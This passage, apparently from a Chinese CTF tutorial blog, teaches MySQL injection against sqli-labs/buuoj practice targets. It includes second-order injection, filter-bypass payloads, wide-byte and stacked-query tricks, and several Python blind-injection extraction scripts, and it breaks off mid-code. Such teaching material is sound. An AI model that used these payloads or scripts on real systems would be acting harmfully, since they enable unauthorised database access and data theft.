title="二次注入"></a>二次注入</h2><p>二次注入用到的SQL语法知识<br>通常二次注入的成因会是插入语句，我们控制自己想要查询的语句插入到数据库中再去找一个能显示插入数据的回显的地方（可能是登陆后的用户名等等、也有可能是删除后显示删除内容的地方~），恶意插入查询语句的示例如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+hex(database())+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>+hex(hex(user()))+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+substr((select hex(hex(select * from flag))),1,10)+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>需要对后端的SQL语句有一个猜测</p><p>这里还有一个点，我们不能直接将要查询的函数插入，因为如果直接插入的话，’database()’会被识别为字符串，我们需要想办法闭合前后单引号的同时将我们的查询插入，就出现了’0’+database()+’0’这样的构造，但是这个的回显是0，但是在我们进行了hex编码之后就能正常的查询了，也就是上面出现的’0’+hex(database())+’0’</p><h3 id="注入流程-3"><a href="#注入流程-3" class="headerlink" title="注入流程"></a>注入流程</h3><p>首先找到插入点，通常情况下是一个注册页面，register.php这种，先简单的查看一下注册后有没有什么注册时写入的信息在之后又回显的，若有回显猜测为二次查询。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+hex(database())+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;0&#x27;</span>+hex(hex(user()))+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line">insert into <span class="built_in">users</span>(<span class="built_in">id</span>,username,password,email) values(1,<span class="string">&#x27;0&#x27;</span>+substr((select hex(hex(select * from flag))),1,10)+<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>)</span><br></pre></td></tr></table></figure><p>构造类似于values中的参数进行注册等操作，然后进行查看，将hex编码解码即可，可能会有其他的先限制，比如超过10位就会转化为科学计数法，我们就需要使用from for语句来进行一个限制，可以编写脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ch = string.ascii_lowercase+string.digits+<span class="string">&#x27;-&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">re = requests.session()</span><br><span class="line">url = <span class="string">&#x27;http://9a88c359-4f55-44e9-9332-4c635c486ef0.node3.buuoj.cn/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">email,username</span>):</span><br><span class="line">    url1 = url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">    data = <span class="built_in">dict</span>(email = email, username = username,password = <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">email</span>):</span><br><span class="line">    url2 = url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">    data = <span class="built_in">dict</span>(email = email,password = <span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">17</span>):</span><br><span class="line">    payload = <span class="string">&quot;0&#x27;+(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))+&#x27;0&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(j)*<span class="number">10</span>+<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">    email = <span class="string">&#x27;&#123;&#125;@qq.com&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(j)+<span class="string">&#x27;14&#x27;</span>)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    <span class="comment"># print html.text</span></span><br><span class="line">    html = login(email)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = r.findall(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>,html.text,r.S)</span><br><span class="line">        hex_flag += <span class="built_in">str</span>(res[<span class="number">0</span>]).strip()</span><br><span class="line">        <span class="built_in">print</span>(hex_flag)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>( hex_flag.decode(<span class="string">&#x27;hex&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="结尾注释符绕过"><a href="#结尾注释符绕过" class="headerlink" title="结尾注释符绕过"></a>结尾注释符绕过</h3><p>Mysql中常见的注释符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">、<span class="comment">#    %23    --+或-- -    ;%00</span></span><br></pre></td></tr></table></figure><p>如果所有的注释符全部被过滤了，把我们还可以尝试直接使用引号进行闭合，这种方法很好用。</p><h3 id="字符串变换绕过"><a href="#字符串变换绕过" class="headerlink" title="字符串变换绕过"></a>字符串变换绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写绕过</span></span><br><span class="line">-1<span class="string">&#x27; UnIoN SeLeCt 1,2,database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 双写绕过</span></span><br><span class="line"><span class="string">-1&#x27;</span> uniunionon selselectect 1,2,database()--+</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串拼接绕过</span></span><br><span class="line">1<span class="string">&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span></span><br></pre></td></tr></table></figure><h3 id="过滤-and、or-绕过"><a href="#过滤-and、or-绕过" class="headerlink" title="过滤 and、or 绕过"></a>过滤 and、or 绕过</h3><p>管道符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure><h3 id="使用-进行异或盲注绕过"><a href="#使用-进行异或盲注绕过" class="headerlink" title="使用^进行异或盲注绕过"></a>使用^进行异或盲注绕过</h3><p>异或运算规则:<br>1^1&#x3D;0 0^0&#x3D;0 0^1&#x3D;1<br>1^1^1&#x3D;0 1^1^0&#x3D;0<br>构造payload:’^ascii(mid(database(),1,1)&#x3D;98)^0<br>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h3 id="过滤空格绕过"><a href="#过滤空格绕过" class="headerlink" title="过滤空格绕过"></a>过滤空格绕过</h3><p>以下字符可以代替空格：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用注释符/**/代替空格:</span></span><br><span class="line">select/**/database();</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用加号+代替空格:(只适用于GET方法中)</span></span><br><span class="line">select+database();</span><br><span class="line"><span class="comment"># 注意: 加号+在URL中使⽤记得编码为%2B: select%2Bdatabase(); (python中不用)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使⽤括号嵌套:</span></span><br><span class="line">select(group_concat(table_name))from(information_schema.taboles)<span class="built_in">where</span>(tabel_schema=database());</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使⽤其他不可⻅字符代替空格:</span></span><br><span class="line">%09, %0a, %0b, %0c, %0d, %a0</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用``分隔进行绕过</span></span><br><span class="line">select host,user from user <span class="built_in">where</span> user=<span class="string">&#x27;a&#x27;</span>union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure><p>同时任然可以利用异或符号进行盲注，我i们可以看到上面的payload中完全可以不存在空格。</p><h3 id="过滤括号绕过"><a href="#过滤括号绕过" class="headerlink" title="过滤括号绕过"></a>过滤括号绕过</h3><p>利用 order by 进行布尔盲注<br>上面有</p><h3 id="过滤比较符号（-x3D-、-lt-、-gt-）绕过"><a href="#过滤比较符号（-x3D-、-lt-、-gt-）绕过" class="headerlink" title="过滤比较符号（&#x3D;、&lt;、&gt;）绕过"></a>过滤比较符号（&#x3D;、&lt;、&gt;）绕过</h3><p>比较符号一般也只出现在盲注中，所以都尽可能搭配了脚本。</p><h3 id="使用-in-绕过"><a href="#使用-in-绕过" class="headerlink" title="使用 in() 绕过"></a>使用 in() 绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or ascii(substr((select database()),1,1)) in(114)--+    // 错误</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or ascii(substr((select database()),1,1)) <span class="keyword">in</span>(115)--+    // 正常回显</span><br><span class="line"></span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or substr((select database()),1,1) in(&#x27;</span>s<span class="string">&#x27;)--+    // 正常回显</span></span><br></pre></td></tr></table></figure><p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>,<span class="number">128</span>):</span><br><span class="line">            url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&#x27; or ascii(substr((select database()),&#123;0&#125;,1)) in(&#123;1&#125;)--+&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            r = requests.get(url=url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="LIKE-注入"><a href="#LIKE-注入" class="headerlink" title="LIKE 注入"></a>LIKE 注入</h3><p>在LIKE子句中，百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线 _ 通配符允许匹配任何单个字符。匹配成功则返回1，反之返回0，可用于sql盲注。</p><ol><li><p>判断数据库长度<br>可用length()函数，也可用_，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>________<span class="string">&#x27;--+  // 回显正常</span></span><br></pre></td></tr></table></figure></li><li><p>判断数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>s%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or (select database()) like <span class="string">&#x27;s%&#x27;</span> --+</span><br><span class="line">或者:</span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() like &#x27;</span>s_______<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or (select database()) like <span class="string">&#x27;s_______&#x27;</span> --+</span><br></pre></td></tr></table></figure><p>如上图所示，回显正常，说明数据库名的第一个字符是s。</p></li></ol><p>综上所述，很明显和普通的布尔盲注差不多，于是写个GET的二分法盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># strs = string.printable</span></span><br><span class="line">strs = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or (select database()) like &#x27;&#123;&#125;%&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">        char = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            payloads = payload.<span class="built_in">format</span>(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                char = j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="REGEXP-注入"><a href="#REGEXP-注入" class="headerlink" title="REGEXP 注入"></a>REGEXP 注入</h3><p>REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。</p><ol><li><p>判断数据库长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or (length(database())) regexp 8 --+  // 回显正常</span></span><br></pre></td></tr></table></figure></li><li><p>判断数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() regexp &#x27;</span>^s<span class="string">&#x27;--+    // 回显正常</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or database() regexp <span class="string">&#x27;se&#x27;</span>--+    // 回显正常, 不适用^和$进行匹配也可以</span><br><span class="line">/?<span class="built_in">id</span>=<span class="string">&#x27; or database() regexp &#x27;</span>^sa<span class="string">&#x27;--+   // 报错</span></span><br><span class="line"><span class="string">/?id=&#x27;</span> or database() regexp <span class="string">&#x27;y$&#x27;</span>--+    // 回显正常</span><br></pre></td></tr></table></figure></li></ol><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># strs = string.printable</span></span><br><span class="line">strs = string.ascii_letters + string.digits + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://b8e2048e-3513-42ad-868d-44dbb1fba5ac.node3.buuoj.cn/Less-8/?id=&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27; or (select database()) regexp &#x27;^&#123;&#125;&#x27;--+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">        char = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">            payloads = payload.<span class="built_in">format</span>(name + j)</span><br><span class="line">            urls = url + payloads</span><br><span class="line">            r = requests.get(urls)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                name += j</span><br><span class="line">                <span class="built_in">print</span>(j, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                char = j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>以上脚本都要注意是掌握编写思路，不是干抄脚本。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>前置知识</p><p><strong>magic_quotes_gpc （魔术引号开关</strong><br>magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p><p>单引号（’）、双引号（”）、反斜线（\）等字符都会被加上反斜线，我们输入的东西如果不能闭合，那我们的输入就不会当作代码执行，就无法产生SQL注入。</p><p><strong>addslashes()函数</strong></p><p>返回在预定义字符之前添加反斜杠的字符串</p><p>预定义字符：单引号（’），双引号（”），反斜杠（\），NULL</p><p>宽字节概念：</p><ol><li>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)</li><li>多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。</li><li>UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</li><li>常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 不存在宽字节注入，可以收集存在宽字节注入的编码。</li><li>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字</li></ol><p>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</p><p>例如说MySql的编码设置为了SET NAMES ‘gbk’或是 SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p><p>宽字节SQL注入的根本原因:</p><p>宽字节SQL注入就是PHP发送请求到MySql时使用了语句</p><p>SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</p><p>magic_quotes_gpc的作用：当PHP的传参中有特殊字符就会在前面加转义字符’&#39;,来做一定的过滤</p><p>为了绕过magic_quotes_gpc的,于是乎我们开始导入宽字节的概念</p><p>我们发现\的编码是%5c，然后我们会想到传参一个字符想办法凑成一个gbk字符,例如：‘運’字是%df%5c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;1\&#x27;</span><span class="string">&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>这条语句因为\使我们无法去注入，那么我们是不是可以用%df吃到%5c,因为如果用GBK编码的话这个就是運，然后成功绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;1�\&#x27;</span><span class="comment">#&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>虽然是写在了过滤引号的位置但是其实不止适用于过滤引号<br>使用反斜杠 \ 逃逸 Sql 语句<br>如果没有过滤反斜杠的话，我们可以使用反斜杠将后面的引号转义，从而逃逸后面的 Sql 语句。</p><p>假设sql语句为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username, password from <span class="built_in">users</span> <span class="built_in">where</span> username=<span class="string">&#x27;$username&#x27;</span> and password=<span class="string">&#x27;$password&#x27;</span>;</span><br></pre></td></tr></table></figure><p>假设输入的用户名是 admin\，密码输入的是 or 1# 整个SQL语句变成了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from <span class="built_in">users</span> <span class="built_in">where</span> username=<span class="string">&#x27;admin\&#x27;</span> and password=<span class="string">&#x27; or 1#&#x27;</span></span><br></pre></td></tr></table></figure><p>由于单引号被转义，and password&#x3D;这部分都成了username的一部分，即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="string">&#x27;admin\&#x27;</span> and password=<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>这样 or 1 就逃逸出来了，由此可控，可作为注入点了。</p><h3 id="堆叠注入时利用-MySql-预处理"><a href="#堆叠注入时利用-MySql-预处理" class="headerlink" title="堆叠注入时利用 MySql 预处理"></a>堆叠注入时利用 MySql 预处理</h3><p>在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。</p><ol><li>PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(hello)供之后调用</li><li>EXECUTE：执行命令</li><li>DEALLOCATE PREPARE：释放命令</li><li>SET：用于设置变量(@a)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;sEt @a=concat(&quot;sel&quot;,&quot;ect flag from flag_here&quot;);PRepare hello from @a;execute hello;#</span></span><br></pre></td></tr></table></figure><p>这里还用大小写简单绕了一下其他过滤</p><p><strong>MySql 预处理配合十六进制绕过关键字</strong><br>基本原理如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(<span class="string">&#x27;show databases&#x27;</span>);</span><br><span class="line">+------------------------------+</span><br><span class="line">| hex(<span class="string">&#x27;show databases;&#x27;</span>)       |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 73686F7720646174616261736573 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="built_in">set</span> @b=0x73686F7720646174616261736573;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; prepare <span class="built_in">test</span> from @b;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; execute <span class="built_in">test</span>;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| challenges         |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| security           |</span><br><span class="line">| <span class="built_in">test</span>               |</span><br><span class="line">+--------------------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.02 sec)</span><br></pre></td></tr></table></figure><p>即payload类似如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;;sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#</span></span><br></pre></td></tr></table></figure><p><strong>MySql预处理配合字符串拼接绕过关键字</strong><br>原理就是借助char()函数将ascii码转化为字符然后再使用concat()函数将字符连接起来，有了前面的基础这里应该很好理解了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> 